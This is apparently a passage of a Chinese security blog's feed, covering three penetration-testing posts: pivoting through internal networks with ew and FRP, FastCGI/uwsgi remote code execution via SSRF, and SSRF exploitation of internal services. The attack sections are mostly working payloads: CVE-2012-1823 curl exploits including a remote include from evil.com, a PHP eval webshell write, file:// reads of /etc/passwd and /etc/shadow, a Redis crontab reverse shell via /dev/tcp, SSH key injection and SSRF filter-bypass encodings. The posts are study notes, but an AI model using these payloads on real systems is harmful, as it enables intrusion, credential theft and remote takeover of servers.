class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 我们自己的VPS执行</span><br><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"># 跳板机A执行</span><br><span class="line">$ ./ew -s lcx_slave -d ip_A -e 8888 -f ip_B -g 9999</span><br><span class="line"></span><br><span class="line"># 跳板机B执行</span><br><span class="line">$ ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line"></span><br><span class="line"># 跳板机C执行</span><br><span class="line">$ ./ew -s rssocks -d ip_B -e 7777</span><br></pre></td></tr></table></figure></p><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks。<br>我们来解读以下这个三级级联，首先这是个反向代理的例子，反向代理的目的端口是C的7777，当隧道建立完成，我们只需要连接到VPS的1080端口，就会自动帮我们转发到7777。我们来看下中间过程如何：首先第一个命令VPS在8888接收反向代理，并且在1080等候我们的连接。第二条命令将跳板机A的8888端口导向9999；第三行命令将跳板机B的9999端口导向7777；最后第四条命令在跳板机上进行反向代理发起连接到跳板机B的7777端口。</p><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>frp也提供了完善的内网穿透的功能，功能上其实和gnork这些差不多，但是相比起来，FRP的配置更为灵活。推荐层度：<code>FRP&gt;Localtunnel&gt;gnork</code></p><blockquote><p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">中文官方文档</a></p></blockquote><h1 id="过墙隧道"><a href="#过墙隧道" class="headerlink" title="过墙隧道"></a>过墙隧道</h1><p>前面介绍的端口转发，有使用http协议，tcp协议，sockts代理的，但是这些协议转发流量太过于碍眼，容易被严谨的防火墙规则过滤，导致shell从内网出不来，那么在这种情况下，我们就需要强有力的过墙隧道。下面是笔者在网上搜罗的一些走udp的dns隧道和走icmp的隧道，可以说这两种打洞手段很别出心裁，笔者看得是叹为观止。这里先把相关的工具链接和看过的文章记录下来。写不动了……，避免篇幅过长（其实是有点懒），下次补上。</p><h2 id="DNS2tcp"><a href="#DNS2tcp" class="headerlink" title="DNS2tcp"></a>DNS2tcp</h2><p><a href="https://pkgs.org/download/dns2tcp" target="_blank" rel="noopener">https://pkgs.org/download/dns2tcp</a></p><p><a href="http://pwdme.cc/2016/11/11/dns2tcp-dns-tunnel/" target="_blank" rel="noopener">http://pwdme.cc/2016/11/11/dns2tcp-dns-tunnel/</a></p><p><a href="https://www.freebuf.com/articles/system/8726.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/8726.html</a></p><p><a href="https://kali.tuisec.win/kalitools/dns2tcp_zh.html" target="_blank" rel="noopener">https://kali.tuisec.win/kalitools/dns2tcp_zh.html</a></p><h2 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h2><p><a href="https://github.com/yarrick/iodine" target="_blank" rel="noopener">https://github.com/yarrick/iodine</a>  </p><p><a href="https://www.freebuf.com/articles/system/178214.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178214.html</a></p><p><a href="https://blog.csdn.net/weixin_36440115/article/details/76400359" target="_blank" rel="noopener">https://blog.csdn.net/weixin_36440115/article/details/76400359</a></p><h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/87976" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——基础篇</a><br><a href="https://www.anquanke.com/post/id/88851" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——进阶利用</a><br><a href="https://www.anquanke.com/post/id/89362" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——实战篇</a><br><a href="http://payloads.online/archivers/2018-02-02/1" target="_blank" rel="noopener">内网渗透常见端口转发方式</a><br><a href="https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/" target="_blank" rel="noopener">玩转SSH端口转发</a><br><a href="https://xz.aliyun.com/t/2354" target="_blank" rel="noopener">内网安全检查/渗透总结</a><br><a href="https://www.hi-linux.com/posts/25686.html" target="_blank" rel="noopener">推荐一款很好用的内网穿透工具—FRP</a><br><a href="https://www.hi-linux.com/posts/24471.html" target="_blank" rel="noopener">Localtunnel内网穿透工具的安装与使用</a><br><a href="https://www.hi-linux.com/posts/29097.html" target="_blank" rel="noopener">CentOS下部署Ngrok服务器</a>   </p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FastCGI RCE in SSRF</title>
      <link href="/2018/12/20/FastCGI-RCE-in-SSRF/"/>
      <url>/2018/12/20/FastCGI-RCE-in-SSRF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在学习ssrf利用的时候，发现不少文章或者议题种提到了fastcgi的远程命令执行。所以本着学习的思路打算去看下相关的内容，参考链接是笔者认为对这一攻击形式讲解还不错的一些菊苣写的文章，特别是p神的深入解读，很值得一看。另外也找到了一些自动化利用的脚本，在参考链接<code>[5]</code>已经给出。这篇文章就当是自己对cgi,fastcgi,php-fpm,uwsgi这些名词的进一步理解。</p></blockquote><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>理解这个漏洞利用方式的一个前提是fastcgi暴露在了公网，当然不排除运维人员粗心大意的情况；但是更多的利用场景还是类似ssrf这样。在服务端开启gopher协议的情况下，我们可以直接通过fastcgi进行命令执行。</p><h1 id="cve-2012-1823"><a href="#cve-2012-1823" class="headerlink" title="cve-2012-1823"></a><code>cve-2012-1823</code></h1><p>下面是网上流传的<code>cve-2012-1823</code> 的poc,细节可以查看参考文献<code>[4]</code>，由于这两个payload具有一定的历史，限制条件比较多，必须限于两个php版本之间，至于为啥是限于两个版本之间，看了p神文章就会明白这里有段开发趣闻。就不展开了，这里仅仅把poc搜集在下面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 本地包含代码执行</span><br><span class="line">curl -H &quot;USER-AGENT: &lt;?system(&apos;id&apos;);die();?&gt;&quot; http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n </span><br><span class="line"></span><br><span class="line"># 远程包含代码执行</span><br><span class="line">curl http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</span><br></pre></td></tr></table></figure></p><h1 id="fastcgi与wsgi"><a href="#fastcgi与wsgi" class="headerlink" title="fastcgi与wsgi"></a>fastcgi与wsgi</h1><p>一直比较好奇fastcgi是个啥，着两天也是看了不少文章，然后结合自己的理解，才把这个概念弄明白。如果对通用网关接口（cgi）了解的话，就不难理解为fastcgi就是cgi的进阶版本。提供了更有效率的接口模式和进程管理，在ubuntu上可以<code>sudo apt install php-fpm</code>安装这个模块支持，否则默认的是PHP-CGI。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。</span><br><span class="line">FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。</span><br><span class="line">PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</span><br><span class="line">PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</span><br></pre></td></tr></table></figure></p><p>上面是针对php的fastcgi来说的，其实在python里面也有网关接口协议,现在可以知道fastcgi与wsgi很多程度上说的是协议，而php-fpm与php-cgi则可以理解为协议的具体实现。同样的在python里面有个实现了wsgi协议的服务器uWSGI，其内置协议就取名为uwsgi，其实是对wsgi的实现和拓展。所以某种层度上说，python里的uwsgi和php里的php-fpm地位十分相似。体现在他们都可以作为nginx 服务应用的接口，提供对python和php的脚本解析支持。</p><p>说了这么多，那么我们为什么需要这些协议？</p><p>可想而知，apache和nginx都是c语言写的程序，而很多服务器解析脚本是php，perl,python等，两个进程交互总得定义一下规范吧，所以这些协议就应运而生。那么为什么服务器不直接在一个语言里面实现呢？实现当然没问题！用过django的伙伴就有体会，其实django内置了一个小型服务器，实现了wsgi协议规范，但是我们实际部署的时候，往往不直接用它它内置的服务器裸奔在公网，而是弄个nginx服务器，然后nginx负责直接的与浏览器交互。试想，我们有了apache，nginx这样高性能且稳定的可以处理高并发的服务器，那就让他们在前面处理请求好了，把接受的请求信息通过协议规范发给后台解析进程管理器，让进程管理器从进程池中启动一个进程并调用相应的脚本解释器。这样分工明确又能够发挥各自的优势，何乐不为？</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>上面说了一堆的背景知识。我们现在言归正传。php-fpm和uwsgi都是默认监听在本地的某个端口，等待前面服务器（是apache或者nginx）解析请求的到来。正因为它无条件的监听在本地某个端口，只要我们可以构造满足协议规范的请求包，就可以执行任意命令。而通过ssrf，利用gopher协议我们可以很轻松的让本地监听的php-fpm和uwsgi为我们所用。至于如何构造满足协议的包，p神写了一片很细很细的文章(<code>参考链接[3]</code>),当然还有自动化生成满足这些协议payload的工具。</p><p>下面以python uwsgi为例，概念验证可以调用gopher协议写入webshell（有写入权限的情况下，本实验已经chmod 777 理想化过网站根目录，实际中需要找到上传目录），（网上已经有很多利用php fastcgi的demo，除此以外还可以直接弹shell,这里就展示了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444&gt;payload.txt</span><br><span class="line"></span><br><span class="line">python uwsgi_exp.py -u 127.0.0.1:4444 -c &quot;echo &apos;&lt;?php @eval($_POST[value]);?&gt;&apos; &gt;/var/www/html/webshell.php&quot;</span><br></pre></td></tr></table></figure></p><p>使用脚本转换成gopher协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"> </span><br><span class="line">def genpayload():</span><br><span class="line">    f = open(&quot;payload.txt&quot;,&quot;br&quot;)</span><br><span class="line">    content = f.read()</span><br><span class="line">    print (urllib.request.quote(content))</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    genpayload()</span><br></pre></td></tr></table></figure></p><p>下载uwsgi 并且运行uwsgi，模拟服务器中uwsgi运行，监听端口8001</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br><span class="line"></span><br><span class="line">uwsgi --socket :8001</span><br></pre></td></tr></table></figure><p><img src="/myimages/fastcgi_rce/run_uwsgi.png" alt="image"></p><p><img src="/myimages/fastcgi_rce/curl_gopher.PNG" alt="image"></p><p><img src="/myimages/fastcgi_rce/webshell.PNG" alt="image"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="http://www.cnblogs.com/LittleHann/p/4561462.html" target="_blank" rel="noopener">PHP FastCGI RCE Vul</a><br>[2] <a href="https://segmentfault.com/a/1190000013112052" target="_blank" rel="noopener">PHP基础之fastcgi协议</a><br>[3] <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a><br>[4] <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">PHP-CGI advisory (CVE-2012-1823)</a><br>[5] <a href="https://github.com/wofeiwo/webcgi-exploits" target="_blank" rel="noopener">webcgi exploits</a><br>[6] <a href="https://cloud.tencent.com/info/4884a1b917bc39d309f17f78a98dfb74.html" target="_blank" rel="noopener">Fastcgi php-fpm 漏洞利用方式</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> 绕过 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssrf突破边界</title>
      <link href="/2018/12/19/ssrf%E5%B0%8F%E8%AE%B0/"/>
      <url>/2018/12/19/ssrf%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/ssrf之内网漫游/index.png" height="550" width="550"></p><blockquote><p>ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。<br><a id="more"></a></p></blockquote><p><img src="/myimages/ssrf之内网漫游/概念脑图.jpg" alt="image"></p><blockquote><p>图片来自：Nop.pw</p></blockquote><h1 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h1><ul><li>CRLF</li><li>file_get_contents()/readfile()</li><li>fsockopen()</li><li>curl_exec()</li><li>XXE</li><li>cURL,LWP,java uri ……</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 从WEB功能上寻找</span><br><span class="line">    通过URL分享内容</span><br><span class="line">    文件处理、编码处理、转码等服务</span><br><span class="line">    在线翻译</span><br><span class="line">    通过URL地址加载与下载图片</span><br><span class="line">    图片、文章的收藏</span><br><span class="line">    设置邮件接收服务器</span><br><span class="line">    </span><br><span class="line">2. 从URL关键字寻找</span><br><span class="line">    share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">    display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure><h1 id="0x02-攻击流程"><a href="#0x02-攻击流程" class="headerlink" title="0x02 攻击流程"></a>0x02 攻击流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 确定ssrf类型：socket直连式，curl lib库调用式......</span><br><span class="line">2. 信息搜集：扫秒本机或者内网开放的主机，及其端口，对照wiki 词条（[List_of_TCP_and_UDP_port_numbers）可以知晓端口运行的服务</span><br><span class="line">3. fuzz允许的协议类型，探测过滤规则，bypass......</span><br><span class="line">4. pwn!!!</span><br></pre></td></tr></table></figure><h1 id="0x03-use-protocol"><a href="#0x03-use-protocol" class="headerlink" title="0x03 use protocol"></a>0x03 use protocol</h1><blockquote><p>图片来自Bible cheatsheet</p></blockquote><p><img src="/myimages/ssrf之内网漫游/url_schema_support.png" alt="image"></p><h2 id="file协议的文件读取"><a href="#file协议的文件读取" class="headerlink" title="file协议的文件读取"></a>file协议的文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?u=file:///etc/passwd</span><br><span class="line">?u=file:/etc/shadow</span><br><span class="line">?u=file:///etc/apache2/sites-available/*</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>当file协议没有过滤的时候，我们可以通过file协议读取敏感文件（权限允许的范围内），包括系统配置，服务器配置，源码……</p><h2 id="dict协议信息收集"><a href="#dict协议信息收集" class="headerlink" title="dict协议信息收集"></a>dict协议信息收集</h2><p>扫端口以及获取服务信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/info</span><br><span class="line">?url=dict://127.0.0.1:6379/keys%20  # 获取redis的键值</span><br><span class="line">?url=dict://127.0.0.1:6379/info     # 获取redis相关信息</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>dict+redis=getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/name:data</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">dict://serverip:port/config:set:dir:/var/spool/cron/  #config set dir /var/spool/cron/  \r\n</span><br></pre></td></tr></table></figure></p><h2 id="gopher获取shell"><a href="#gopher获取shell" class="headerlink" title="gopher获取shell"></a>gopher获取shell</h2><p>要知道，如果我们发现了ssrf，然后再内网找到了一台未授权访问的redis服务，那么整个大门就会为我们敞开。进一步的渗透工作就成了从redis反弹shell的简单问题。之前有写过一篇redis未授权访问相关文章，也开源了docker 镜像，可以很方便的练手。这里摘录下两个常见getshell思路，也算是对上次的回顾。</p><p>crontab定时任务弹shell payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;   #设置定时任务载体键值</span><br><span class="line"># 设置数据库存储路径（权限运行的情况下）</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line"># 设置文件名为root 即root用户的定时任务</span><br><span class="line">config set dbfilename root  </span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>谈到定时任务这个地方，需要科普一下linux下的定时任务相关操作。围绕linux下的定时任务涉及两个命令：<code>cron</code>，<code>crontab</code>。cron是随主机启动的守护进程，其监视的定时任务文件夹或文件如下（按优先级次序）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. /var/spool/cron/crontabs/   #这个文件夹下文件以用户名命名，每个文件对应一个用户的定时任务表，一般通过crontab -e 进行编写</span><br><span class="line">2. /etc/crontab               #这个目录一般是系统级别的定时任务，其定义了四个part: /etc/cron.hourly，/etc/cron.daily,/etc/cron.weekly,/etc/cron.monthly 所以一般情况下，我们都不直接对crontab进行操作，而是再对应的四个part 部分定义 时，天，周，月层次上的cron任务</span><br><span class="line">3. /etc/cron.d/               # 一般不再这个文件夹下进行操作</span><br></pre></td></tr></table></figure></p><p>另外，还需要注意，<code>/etc/cron.deny</code>,<code>/etc/cron.allow</code>两个文件限制了哪些用户不能够进行定时任务，这在渗透中很致命，所以得引起关注。</p><p>ssh 公钥注入payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#公钥转储到foo.txt</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt  </span><br><span class="line"></span><br><span class="line">#将文件转化为键值</span><br><span class="line">cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit</span><br><span class="line"></span><br><span class="line">#设置数据库存储目录（需要redis root用户运行，或者降权将设置为redis运行用户目录）</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>上面是直接与redis 交互下的反弹shell 操作，在 ssrf中利用dict或者gopher协议也可以直接达到这种效果，下面主要介绍gopher协议下的利用方式：<br>gopher协议是http协议他爹，所以很多协议都对其做了向前兼容，所以，虽然gopher协议已经是历史，但是在渗透的时候还是会发挥很大的作用。当然要利用这个协议，就需要按照协议的规范，也就是说我们需要本地抓包对payload 进行协议转换，使其符合gopher 协议格式就可以利用。</p><blockquote><p>这里推荐一款自动化payload 生成工具：<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a>   </p></blockquote><p>诚然，我们也可以利用wireshark，tcpdump，socat……等工具进行抓包，强烈推荐socat，因为大师傅留下的转化脚本，可以省去协议转化的麻烦，脚本待会奉上。</p><p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p><p>对本地4444 端口进行转发到6379，并接听4444端口的流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">exp = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</span><br><span class="line">            continue</span><br><span class="line">        # 判断倒数第2、3字符串是否为\r</span><br><span class="line">        elif line[-3:-1] == r&apos;\r&apos;:</span><br><span class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</span><br><span class="line">            if len(line) == 3:</span><br><span class="line">                exp = exp + &apos;%0a%0d%0a&apos;</span><br><span class="line">            else:</span><br><span class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</span><br><span class="line">                # 去掉最后的换行符</span><br><span class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        # 判断是否是空行，空行替换为%0a</span><br><span class="line">        elif line == &apos;\x0a&apos;:</span><br><span class="line">            exp = exp + &apos;%0a&apos;</span><br><span class="line">        else:</span><br><span class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">            exp = exp + line</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure><h2 id="http协议访问裸奔restful接口"><a href="#http协议访问裸奔restful接口" class="headerlink" title="http协议访问裸奔restful接口"></a>http协议访问裸奔restful接口</h2><blockquote><p>例子：CouchDB restful api ，参考链接[9]</p></blockquote><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap://hostname:port/%0a%0dcommand%0a%0dcommand</span><br></pre></td></tr></table></figure><h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><h1 id="0x04-bypass-relevance"><a href="#0x04-bypass-relevance" class="headerlink" title="0x04 bypass relevance"></a>0x04 bypass relevance</h1><h2 id="common"><a href="#common" class="headerlink" title="common"></a>common</h2><blockquote><p>以下内容摘录自参考链接[5]</p></blockquote><p>Bypass using HTTPS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/</span><br><span class="line">https://localhost/</span><br><span class="line">Bypass localhost with [::]</span><br></pre></td></tr></table></figure></p><p>Bypass localhost<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://[::]:80/</span><br><span class="line">http://[::]:25/ SMTP</span><br><span class="line">http://[::]:22/ SSH</span><br><span class="line">http://[::]:3128/ Squid</span><br><span class="line">http://0000::1:80/</span><br><span class="line">http://0000::1:25/ SMTP</span><br><span class="line">http://0000::1:22/ SSH</span><br><span class="line">http://0000::1:3128/ Squid</span><br></pre></td></tr></table></figure></p><p>Bypass with nip.io<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even 127.0.0.1.nip.io maps to 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>Bypass with 302<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Location: xxx://xxx.xxxx.xxx/xxx&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>Bypass with @</p><p><img src="/myimages/ssrf之内网漫游/WeakParser.jpg" alt="image"></p><p>Bypass using a decimal ip location<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0.0.1/</span><br><span class="line">http://2130706433/ = http://127.0.0.1</span><br><span class="line">http://3232235521/ = http://192.168.0.1</span><br><span class="line">http://3232235777/ = http://192.168.1.1</span><br></pre></td></tr></table></figure></p><p>Bypass using enclosed alphanumerics<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br><span class="line"></span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure></p><p>Bypass with Alternate IP encoding<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://425.510.425.510/ Dotted decimal with overflow</span><br><span class="line">http://2852039166/ Dotless decimal</span><br><span class="line">http://7147006462/ Dotless decimal with overflow</span><br><span class="line">http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal</span><br><span class="line">http://0xA9FEA9FE/ Dotless hexadecimal</span><br><span class="line">http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow</span><br><span class="line">http://0251.0376.0251.0376/ Dotted octal</span><br><span class="line">http://0251.00376.000251.0000376/ Dotted octal with padding</span><br></pre></td></tr></table></figure></p><h2 id="php-fsockopen-cheatsheep"><a href="#php-fsockopen-cheatsheep" class="headerlink" title="php fsockopen() cheatsheep"></a>php <code>fsockopen()</code> cheatsheep</h2><p><img src="/myimages/ssrf之内网漫游/fsockopen_bypass.png" alt="image"></p><h2 id="php-readfile-and-parse-url"><a href="#php-readfile-and-parse-url" class="headerlink" title="php readfile() and parse_url()"></a>php <code>readfile()</code> and <code>parse_url()</code></h2><blockquote><p>图片来自 参考链接[7]</p></blockquote><p><img 